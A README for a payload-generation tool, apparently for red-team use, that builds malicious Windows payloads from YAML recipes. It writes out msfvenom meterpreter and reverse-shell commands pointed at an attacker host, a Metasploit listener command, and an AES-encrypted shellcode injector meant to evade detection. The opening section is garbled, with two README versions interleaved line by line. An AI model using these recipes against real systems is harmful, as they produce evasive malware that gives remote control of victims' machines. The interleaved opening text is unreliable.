# Paygen - Payload Generation Framework# Paygen - Payload Generation Framework v2.0# paygen



A menu-driven Terminal User Interface (TUI) tool for generating and customizing malicious payloads with MITRE ATT&CK context, effectiveness ratings, and advanced preprocessing pipelines.Menu-driven TUI tool for generating and customizing malicious payloads with MITRE ATT&amp;CK context



![Python Version](https://img.shields.io/badge/python-3.10%2B-blue)A menu-driven TUI tool for generating and customizing malicious payloads with MITRE ATT&CK context and effectiveness ratings.

![License](https://img.shields.io/badge/license-Private-red)

## Features

---

- 🎨 **Beautiful TUI** with Catppuccin Mocha theme and vim-style navigation

## Features- 📦 **Template-based** payload generation using Jinja2

- 🔧 **Command-based** recipes for external tools (msfvenom, sliver, etc.)

- 🎨 **Beautiful TUI** - Catppuccin Mocha color scheme with intuitive 3-panel layout- 🔐 **Preprocessing system** with built-in encryption and custom scripts

- 📋 **Recipe System** - YAML-based payload definitions with metadata- 🎯 **Freeform categories** for flexible organization

- 🔄 **Preprocessing Pipeline** - XOR/AES encryption, compression, encoding, custom scripts- 📊 **Effectiveness ratings** and MITRE ATT&CK mappings

- 🎯 **MITRE ATT&CK Mapping** - Track tactics, techniques, and artifacts- ⚙️ **Configuration system** at `~/.config/paygen/config.yaml`

- 📊 **Effectiveness Ratings** - HIGH/MEDIUM/LOW evasion ratings

- 📜 **Build History** - Track all generated payloads with parameters## Installation

- ⚡ **Template-Based** - Jinja2 templating for flexible code generation

- 🛠️ **Command-Based** - Direct integration with msfvenom, Sliver, etc.```bash

- 🔐 **Built-in Crypto** - AES-256-CBC, XOR, Base64, compression utilities# Clone the repository

- 📝 **Parameter Validation** - IP, port, hex, path validation with defaultsgit clone https://github.com/Hailst0rm1/paygen.git

cd paygen

---

# Install dependencies

## Installationpip install -r requirements.txt



### Prerequisites# Run paygen

python -m src.main

- Python 3.10 or higher```

- pip (Python package manager)

## Project Structure

### Required System Tools

```

Depending on which recipes you use, you may need:paygen/

├── src/               # Source code

- **msfvenom** (Metasploit) - For shellcode generation│   ├── core/         # Core functionality

- **mcs** (Mono C# compiler) - For C# payload compilation│   ├── tui/          # TUI components

- **gcc/mingw-w64** - For C/C++ compilation│   └── utils/        # Utilities

- **xclip** (Linux) - For clipboard operations in history├── recipes/          # Recipe YAML files

├── payloads/         # Source code templates

### Install from Source├── preprocessors/    # Custom preprocessing scripts

└── output/           # Generated payloads (gitignored)

```bash```

# Clone the repository (private)

git clone git@github.com:Hailst0rm1/paygen.git## Configuration

cd paygen

Configuration is stored at `~/.config/paygen/config.yaml`:

# Create and activate virtual environment (recommended)

python -m venv venv```yaml

source venv/bin/activate  # On Linux/macOSrecipes_dir: "~/Documents/Tools/paygen/recipes"

# orpayloads_dir: "~/Documents/Tools/paygen/payloads"

venv\Scripts\activate     # On Windowspreprocessors_dir: "~/Documents/Tools/paygen/preprocessors"

output_dir: "~/Documents/Tools/paygen/output"

# Install dependenciestheme: "catppuccin_mocha"

pip install -r requirements.txttransparent_background: true

```

# Run paygen

python -m src.main## Recipe Format

```

See `plan.md` for complete recipe schema and examples.

### Install via pip (editable mode)

## Development Status

```bash

cd paygen- [x] Phase 1: Core Infrastructure

pip install -e .- [ ] Phase 2: Preprocessing System

```- [ ] Phase 3: TUI Development

- [ ] Phase 4: Payload Generation

Then run from anywhere:- [ ] Phase 5: Recipe Development

- [ ] Phase 6: Polish & Distribution

```bash

paygen## License

```

Private repository - not for public distribution.

---

## Quick Start

1. **Launch the TUI**
   ```bash
   python -m src.main
   ```

2. **Browse Recipes**
   - Use `j`/`k` or arrow keys to navigate categories and recipes
   - Recipe details appear automatically in the middle panel
   - Code preview shows in the right panel

3. **Generate a Payload**
   - Press `Ctrl+G` or navigate to a recipe and press `g`
   - Fill in required parameters (marked with `*`)
   - Press `Enter` to start generation
   - View real-time build progress

4. **View Build History**
   - Press `Ctrl+H` to see all generated payloads
   - View parameters, launch instructions, build steps
   - Press `r` to regenerate with same parameters
   - Press `c` to copy launch instructions

---

## Configuration

Paygen stores its configuration in `~/.config/paygen/config.yaml`:

```yaml
# Directory paths
recipes_dir: "~/Documents/Tools/paygen/recipes"
payloads_dir: "~/Documents/Tools/paygen/payloads"
preprocessors_dir: "~/Documents/Tools/paygen/preprocessors"
output_dir: "~/Documents/Tools/paygen/output"

# Build preferences
keep_source_files: false      # Keep rendered source code
show_build_debug: false       # Show verbose output
```

The config file is automatically created on first run. Edit it to customize paths.

---

## Recipe Format

Recipes are YAML files that define how to generate payloads. They consist of four main sections:

### 1. Metadata

```yaml
meta:
  name: "Recipe Name"
  category: "Process Injection"
  description: |
    Multi-line description of the payload,
    its effectiveness, and use cases.
  
  effectiveness: "high"  # low | medium | high
  
  mitre:
    tactic: "TA0005 - Defense Evasion"
    technique: "T1055 - Process Injection"
  
  artifacts:
    - "API calls to VirtualAllocEx"
    - "Suspicious memory allocation patterns"
```

### 2. Parameters

```yaml
parameters:
  - name: "lhost"
    type: "ip"
    description: "Attacker IP address"
    required: true
  
  - name: "lport"
    type: "port"
    description: "Listener port"
    required: true
    default: 4444
  
  - name: "output_file"
    type: "string"
    description: "Output filename"
    required: true
    default: "payload.exe"
```

**Supported Parameter Types:**
- `ip` - IPv4/IPv6 address
- `port` - Port number (1-65535)
- `string` - Any text
- `path` - Directory path
- `file` - File path
- `hex` - Hexadecimal string
- `bool` - Boolean (true/false)
- `choice` - Select from predefined options
- `integer` - Whole number with optional range

### 3. Preprocessing Pipeline

```yaml
preprocessing:
  # Generate shellcode with msfvenom
  - type: "command"
    name: "generate_shellcode"
    command: |
      msfvenom -p windows/x64/meterpreter_reverse_tcp \
        LHOST={{ lhost }} LPORT={{ lport }} -f raw
    output_var: "raw_shellcode"
  
  # Encrypt with AES-256-CBC
  - type: "script"
    name: "aes_encryption"
    script: "aes_encrypt.py"
    args:
      data: "{{ raw_shellcode }}"
      key: "auto"
      iv: "auto"
    output_var: "encrypted_data"
```

**Built-in Preprocessors:**
- `xor_encrypt.py` - XOR encryption with auto-key generation
- `aes_encrypt.py` - AES-256-CBC encryption
- `base64_encode.py` - Base64 encoding
- `compress.py` - Gzip compression
- `format_csharp.py` - Format bytes as C# byte array
- `caesar_cipher.py` - Caesar cipher

### 4. Output Configuration

**Template-Based Recipes:**

```yaml
output:
  type: "template"
  template: "process_injection/injector.cs"
  
  compile:
    enabled: true
    command: "mcs -out:{{ output_path }}/{{ output_file }} -platform:x64 -unsafe {{ source_file }}"
  
  launch_instructions: |
    Start listener:
    msfconsole -x "use exploit/multi/handler; set LHOST {{ lhost }}; exploit"
    
    Execute on target:
    {{ output_file }}
```

**Command-Based Recipes:**

```yaml
output:
  type: "command"
  command: "msfvenom -p {{ payload }} LHOST={{ lhost }} -f exe -o {{ output_path }}/{{ output_file }}"
  
  launch_instructions: |
    Transfer and execute {{ output_file }} on target
```

---

## Keybindings

### Global Navigation
- `j` / `k` / `↑` / `↓` - Navigate up/down
- `h` / `l` / `Tab` - Switch panels
- `gg` - Jump to top
- `G` - Jump to bottom

### Actions
- `Ctrl+G` - Generate payload (from any panel)
- `Ctrl+H` - View build history
- `Ctrl+F` - Toggle fullscreen (code panel)
- `?` - Show help
- `Ctrl+Q` - Quit application

### History View
- `Enter` - View entry details
- `r` - Regenerate payload with same parameters
- `c` - Copy launch instructions to clipboard
- `d` - Delete history entry
- `o` - Open output directory
- `Esc` - Close history/Go back

---

## Creating Custom Recipes

### Template-Based Recipe

1. **Create the template file** in `payloads/`:
   ```csharp
   // payloads/my_payload/injector.cs
   using System;
   
   class Payload {
       static byte[] shellcode = { {{ encrypted_shellcode }} };
       static byte[] key = { {{ aes_key }} };
       
       static void Main() {
           // Your payload logic here
           // Can use any preprocessing output variables
       }
   }
   ```

2. **Create the recipe YAML** in `recipes/`:
   ```yaml
   meta:
     name: "My Custom Payload"
     category: "Custom"
     description: "Description here"
     effectiveness: "high"
   
   parameters:
     - name: "lhost"
       type: "ip"
       required: true
   
   preprocessing:
     - type: "command"
       name: "generate_shellcode"
       command: "msfvenom -p windows/x64/shell_reverse_tcp LHOST={{ lhost }} -f raw"
       output_var: "raw_shellcode"
     
     - type: "script"
       name: "encrypt"
       script: "aes_encrypt.py"
       args:
         data: "{{ raw_shellcode }}"
       output_var: "encrypted_data"
   
   output:
     type: "template"
     template: "my_payload/injector.cs"
     compile:
       enabled: true
       command: "mcs -out:{{ output_path }}/{{ output_file }} {{ source_file }}"
   ```

### Custom Preprocessor Script

Create a Python script in `preprocessors/`:

```python
#!/usr/bin/env python3
"""
Custom preprocessor example
"""
import sys
import json
import base64

def main():
    # Read JSON input from stdin
    args = json.load(sys.stdin)
    
    # Get input data
    data_input = args.get('data')
    
    # Decode if base64
    try:
        data = base64.b64decode(data_input)
    except:
        data = data_input.encode('utf-8')
    
    # Process the data
    result = process(data, args)
    
    # Output as JSON or plain text
    output = {
        'processed': base64.b64encode(result).decode('ascii'),
        'size': len(result)
    }
    print(json.dumps(output))

def process(data, args):
    # Your custom processing logic
    return data

if __name__ == "__main__":
    main()
```

Make it executable:
```bash
chmod +x preprocessors/my_preprocessor.py
```

Use it in recipes:
```yaml
preprocessing:
  - type: "script"
    name: "custom_process"
    script: "my_preprocessor.py"
    args:
      data: "{{ some_variable }}"
      custom_arg: "value"
    output_var: "processed_data"
```

---

## Example Workflows

### Simple Msfvenom Payload

1. Select "Basic Msfvenom Reverse TCP Shell" recipe
2. Press `Ctrl+G`
3. Enter:
   - `lhost`: Your IP (e.g., 192.168.1.100)
   - `lport`: 4444 (default)
4. Press `Enter` to generate
5. Copy launch instructions and start listener

### Encrypted Process Injection

1. Select "C# AES-Encrypted Shellcode Injector"
2. Press `Ctrl+G`
3. Enter:
   - `target_process`: explorer.exe
   - `lhost`: Your IP
   - `lport`: 4444
4. View build progress as it:
   - Generates shellcode with msfvenom
   - Encrypts with AES-256
   - Formats as C# byte arrays
   - Compiles to executable
5. Follow launch instructions to execute

---

## Directory Structure

```
paygen/
├── ~/.config/paygen/           # User configuration
│   ├── config.yaml             # Settings
│   └── history.json            # Build history
├── recipes/                    # Recipe definitions (YAML)
├── payloads/                   # Source code templates
├── preprocessors/              # Processing scripts
├── output/                     # Generated payloads (gitignored)
└── src/                        # Application source code
```

---

## Troubleshooting

### "Compiler not found" error

Install the required compiler:
```bash
# For C# (Mono)
sudo apt install mono-mcs  # Debian/Ubuntu
sudo pacman -S mono        # Arch

# For C/C++
sudo apt install gcc mingw-w64

# For msfvenom
sudo apt install metasploit-framework
```

### "Permission denied" when executing payload

Make output file executable:
```bash
chmod +x output/payload.exe
```

### Templates not rendering variables

Ensure preprocessing output variables match template placeholders:
- Recipe: `output_var: "encrypted_data"`
- Template: `{{ encrypted_data }}`

Variable names must match exactly (case-sensitive).

### History clipboard operations failing

Install xclip (Linux):
```bash
sudo apt install xclip
```

---

## Security Considerations

⚠️ **IMPORTANT**: This tool generates malicious payloads for authorized security testing only.

- **Never commit** the `output/` directory
- **Never commit** generated payloads or binaries
- **Test in isolated environments** (VMs, sandboxes)
- **Get authorization** before using on any system
- **Follow responsible disclosure** for vulnerabilities
- **Understand legal implications** in your jurisdiction

Paygen is for:
- ✅ Authorized penetration testing
- ✅ Red team operations
- ✅ Security research
- ✅ Educational purposes

Paygen is **NOT** for:
- ❌ Unauthorized access
- ❌ Malicious activity
- ❌ Illegal operations

---

## Development

### Running Tests

```bash
pytest
```

### Code Structure

- `src/core/` - Core functionality (config, recipes, building)
- `src/tui/` - Terminal UI components
- `src/utils/` - Utility functions

### Adding Features

1. Fork and create a feature branch
2. Implement changes with tests
3. Update documentation
4. Submit pull request

---

## Roadmap

- [ ] Docker containerization for isolated builds
- [ ] Additional payload templates (Go, Rust, Python)
- [ ] Integration with C2 frameworks
- [ ] Automated obfuscation techniques
- [ ] OPSEC scoring system
- [ ] Multi-stage payload generation

---

## License

Private repository - All rights reserved.

For authorized users only. Do not distribute.

---

## Acknowledgments

- **Textual** - Modern TUI framework
- **Catppuccin** - Beautiful color palette
- **Metasploit** - Shellcode generation
- **PyCryptodome** - Cryptography utilities

---

## Contact

For issues, questions, or feature requests, contact the repository owner.

**Author**: Hailst0rm  
**Repository**: https://github.com/Hailst0rm1/paygen (Private)

---

**Remember**: With great power comes great responsibility. Use ethically. 🛡️
